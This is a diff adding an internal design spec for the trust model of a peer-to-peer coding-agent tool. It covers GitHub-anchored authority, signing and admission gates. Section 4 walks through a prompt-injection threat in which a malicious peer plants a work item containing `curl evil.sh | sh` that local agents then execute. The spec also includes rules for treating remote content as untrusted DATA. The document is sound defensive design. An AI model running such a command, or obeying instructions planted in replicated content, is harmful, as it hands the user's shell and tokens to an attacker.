@@ -1,0 +1,104 @@
+# Trust model
+URL: /internal/docs/spec/trust-model
+
+How Papercusp decides what to trust — GitHub is the authority of record, peer state is advisory, and the real threat is the confused deputy. Distilled from the research-backed design memo.
+
+import { Aside } from '@astrojs/starlight/components';
+
+The Papercusp trust model in one line: **GitHub is the authority of record; peer-synced state is an advisory cache; and the security layer's real job is to protect the *user's machine* from malicious replicated content — not to make peer state Byzantine-trustworthy.**
+
+This page distills the research-backed design memo (a code-truth audit + a 3-pass cited survey of comparable P2P / local-first systems). For the full survey, the per-system mapping table, and the sources, see the plan `papercusp-trust-model-2026-05-31`.
+
+## 1. The gap (from the code audit)
+
+A code-level audit found that **GitHub is the only authorization actually enforced today.** Every trust layer on top of it was dead code or self-asserted: the 5-state feature machine had zero non-test callers; the PR "trusted authors" gate had no writer; `completion_ref` was never written (a writer — `stampCompletionRefOnMerge`, wired into `prs.ts`'s `reviewPr` → `tryAutoMerge` — has since landed, implementing recommendation #7 below); the Hyperbee/Autobase substrate projected **unsigned, unauthenticated ops** verbatim into every peer's Postgres, and the swarm topic was derivable from the **public** repo id — so any peer could join and forge rows.
+
+The one thing that *is* enforced: PR merges go through GitHub's REST API with a real user token, so **GitHub's write-access + branch-protection are real.** That single fact drives the whole model.
+
+Two distinct threat models, kept separate:
+
+* **Untrustworthy local user** — everything is `auth:'public'` on loopback; trusts whoever is on the desktop. Fine for single-user, not a shared machine.
+* **Untrustworthy swarm peer** *(the serious one)* — public topic + unsigned ops ⇒ any peer can poison every other peer's local DB/UI.
+
+## 2. The recommended model — "GitHub is the authority of record; peers are advisory"
+
+1. **Authority of record = GitHub.** Every *decision-bearing* fact — did it merge, who has write access, real PR status, who is a contributor — is **re-derived from GitHub at the point of action**, never trusted from a peer.
+2. **Peer-synced rows = advisory cache** (fast/offline UI), explicitly untrusted.
+3. **Per-op Ed25519 signing + verify-on-receipt** is *defense-in-depth / UX integrity* (stops a peer poisoning local UI), **not** the authority of record. Sign sequence + freshness, not just content (Radicle's replay-CVE lesson).
+4. **GitHub-anchored writer admission** + a `revoked_pubkeys` advisory projection-time drop-list.
+5. **Identity binding = a Keybase-style signed link** — a GitHub-hosted device-signed proof any peer can cross-check; revocation is a *signed* statement.
+6. **Device-key rotation/recovery is GitHub-rooted** — GitHub (the account) is the recovery anchor.
+7. **"Shipped"/provenance = GitHub-derived** — read merge state from GitHub. Do **not** build a Rekor-style transparency log; GitHub already is the authority.
+8. **Sybil/admission = the GitHub collaborator graph** as the allow-list + a connect-time `firewall(remotePublicKey)` hook.
+9. **Do NOT** adopt MLS (conflicts with concurrent merge) or build a Byzantine-CRDT ACL. Keyhive/BeeKEM is the documented upgrade path *only if* a concrete threat model later demands real post-compromise security.
+
+### The advisory-vs-trusted boundary (the central decision)
+
+| Synced surface                         | Advisory cache?            | Decision-bearing → re-derive from GitHub?                               |
+| -------------------------------------- | -------------------------- | ----------------------------------------------------------------------- |
+| Feature queue / status                 | yes (display/coordination) | a "shipped" decision → **GitHub merge state**                           |
+| PR status                              | yes (display)              | merge/approval authority → **GitHub**                                   |
+| Contributor list                       | yes (display)              | "is X a real contributor / has write access" → **GitHub collaborators** |
+| Feature claims (who's working on what) | yes (coordination only)    | (advisory by nature; no hard authority)                                 |
+| Completion / "shipped ✓"               | no                         | **GitHub-derived only**                                                 |
+
+Anything in the right column must never be acted on from peer state alone.
+
+## 3. Accepted-insecurity tradeoffs (the sign-off checklist)
+
+The model *deliberately accepts*: (1) a public, discoverable topic (spam is mitigated, not prevented); (2) advisory peer state can be transiently forged in local DB/UI; (3) no true removal / no PCS in an append-only log — revocation is best-effort projection filtering; (4) Sybil resistance delegated to GitHub (only as strong as the two-channel binding); (5) per-op signatures don't defeat a signed equivocator (Kleppmann) — accepted because state is advisory + GitHub-re-derived; (6) identity binding inherits GitHub account integrity; (7) the local API stays loopback-trusted (single-user desktop).
+
+## 4. The real threat — the confused deputy (protect the user, not the state)
+
+The headline reframe: **replicated content isn't just data we display — it becomes prompt material fed to coding agents that run on the user's machine, with the user's shell and tokens.** A malicious peer who can write your replicated state can plant a "feature" / "supervisor note" / "inter-agent message" whose text is really `curl evil.sh | sh` — and your local worker, reading it as a legitimate work item, **executes it with your machine's authority.** This is prompt injection → local code execution, and **op-signing does not fix it** (a signed-but-malicious instruction still injects). The defense must sit on the *content → agent → execution* path.
+
+The dangerous flow:
+
+```
+remote peer writes op → replicated → projected into local PG
+   → prompt-assembly feeds it to an agent → spawn claude/omp/codex locally
+   → agent runs tools/shell with the user's authority
+```
+
+### The four gates
+
+| Gate                                      | Where                                                                                                                                | What                                                                                                                                                                                                                                                              |
+| ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **G1 — Provenance** (prerequisite)        | replicated op → local PG projection                                                                                                  | thread the unforgeable `writerPubkey` through; stamp `author_pubkey` + `origin: local\|remote`. Attribution, not rejection.                                                                                                                                       |
+| **G2 — Auditor-admission** (primary)      | every claim/place chokepoint (frontier read + `claimNextWorkItem` / `claimWorkItem` / `claimReplicaSlotLocal` / `fleet:place_batch`) | a read-only `auditor` role screens every `origin=remote` feature → `admit \| reject`; only `origin=local` or admitted features reach the pick loop. Rejects auto-escalate to a human. Keys on the unforgeable `writerPubkey`, never the forgeable GitHub user id. |
+| **G3 — Untrusted-data framing**           | prompt assembly                                                                                                                      | wrap remote-authored content (feature notes, debugger findings, inter-agent messages) as clearly-delimited third-party **DATA**, never instructions.                                                                                                              |
+| **G4 — Spawn least-privilege** (backstop) | local agent spawn                                                                                                                    | hand the child only the env/tokens its role needs; tighten the tool/shell surface. Bounds damage if the auditor is fooled.                                                                                                                                        |
+
+Replicated content is untrusted input — it may inform and propose, but it must never autonomously drive code execution on the local machine without local-human admission.
+
+Two refinements landed in G2 after this memo (see `shared-pot-trust-admission-2026-06-14`):
+
+* **Every chokepoint, not one read.** The original gate lived on the single feature-frontier read; the fleet/blackboard distribution layer (`claimNextWorkItem`, `claimWorkItem`, `claimReplicaSlotLocal`, `fleet:place_batch`/`gatherFrontier`) grew up around that read and never inherited it — so un-screened remote work was claimable. The admission predicate (`isAutoPickable` / `autoPickableWhereSql`) is now the single source of truth applied at **every** claim/place chokepoint, so a future distribution path can't silently re-open the hole. The live DBOS frontier read carries the same inline `origin`/`audit_verdict` gate as a fail-safe.
+* **A verified-id trust fast-path — still not a forgeable one.** Admission also auto-admits a remote, un-admitted feature when its `author_pubkey` resolves to a `github_user_id` in the owner's workspace-scoped local trust list. Crucially, that id is resolved **only** via a verified, non-revoked device attestation (`resolveVerifiedAuthorGithubId`) — a self-claimed GitHub id never qualifies, and the trust check is workspace-scoped (no cross-workspace leak). So the "never the forgeable GitHub id" rule still holds: the new path keys on a verified-and-attested id, alongside the auditor verdict.
+
+G1 + G2 are substrate-independent and land first. Full sequencing lives in `papercusp-user-protection-gate-2026-05-31`.
+
+## 5. The substrate write-model decision (Model B)
+
+A choice that was implicit became explicit and **decided: Model B** (per-peer single-writer signed logs + a local read-merge) over **Model A** (multi-writer Autobase → one shared merged view).
+
+* **Why B:** each peer writes only facts *about itself*, natively signed by its device key — so there's **no shared structure to forge into**, and revocation is trivial (stop reading the log). The forged-op and multi-writer-flood threat classes **dissolve** rather than needing mitigation. It's also the dominant Hyperswarm pattern (simpler, looser coupling, selective replication, permissionless publish).
+* **The cost B pays:** no free global total order of events — whose main use was deterministic distributed-claim arbitration. That's re-homed to **GitHub-anchored or LWW-advisory claims** (consistent with "shipped = GitHub-derived").
+
+This is why per-op-rate-limiting and per-op-authentication are **the price of Model A, not unconditional requirements** — and why the substrate moved to B.
+
+## 6. The code-review gate (for autonomous PRs)
+
+When agents open PRs, the merge gate decouples review authority from the submitter:
+
+* A PR **cannot merge** (GitHub branch-protection required check) without a valid **review attestation** signed by a *current* GitHub-derived **trusted signer** — so an untrusted peer can submit, because the authority is the signer's attestation, not the submitter.
+* **Deterministic checks are the load-bearing, hard-gated layer** — tests, type-check, lint, SAST (Semgrep/CodeQL), secret/dep scan, policy allow-lists → emit SARIF, model-free, run in a cheap CPU TEE or signed CI. For narrow properties they're effectively sound.
+* **The LLM judge is the attested-but-fallible assist** — malicious/security → hard block; quality → advisory unless high-severity. A TEE makes the verdict *unforgeable, not correct*; high-risk diffs keep a human signer.
+* The **canonical review prompt** is pinned + hash-bound, treats the diff as untrusted DATA, is CWE-anchored, fed the deterministic SARIF as context, and emits strict JSON. The receipt must bind `hash(prompt ‖ diff) + output + build`, verified offline (a receipt that signs only the output lets an attacker attach a benign-prompt receipt to a malicious diff).
+* **Compute lanes:** local TEE (own GPU), BYOK frontier (Claude — provider-trust only), or confidential cloud (Phala/NEAR — offline-verifiable hardware receipt). Don't marry one provider.
+
+## Related
+
+* Plan: `papercusp-trust-model-2026-05-31` (the full memo + the cited survey).
+* Plan: `papercusp-user-protection-gate-2026-05-31` (the four-gate build).
+* [Spawn signing](/internal/docs/endpoint-system/spawn-signing) · [Phase-1b federation limitations](/internal/docs/agent-insights/phase1b-federation-limitations).
